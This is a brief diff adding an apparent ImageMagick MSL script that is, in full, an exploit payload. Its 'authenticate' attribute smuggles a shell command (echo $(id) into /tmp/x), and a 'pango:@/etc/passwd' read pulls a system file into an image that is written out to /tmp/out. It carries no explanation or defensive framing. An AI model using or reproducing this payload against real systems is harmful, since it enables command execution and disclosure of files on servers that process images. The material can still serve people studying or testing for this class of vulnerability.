@@ -1,0 +1,6 @@
+<image authenticate='ff" `echo $(id)>/tmp/x`'>
+  <read filename="pango:@/etc/passwd" />
+  <get width="base-width" height="base-height" />
+  <resize geometry="400x400" />
+  <write filename="info:/tmp/out" />
+</image>
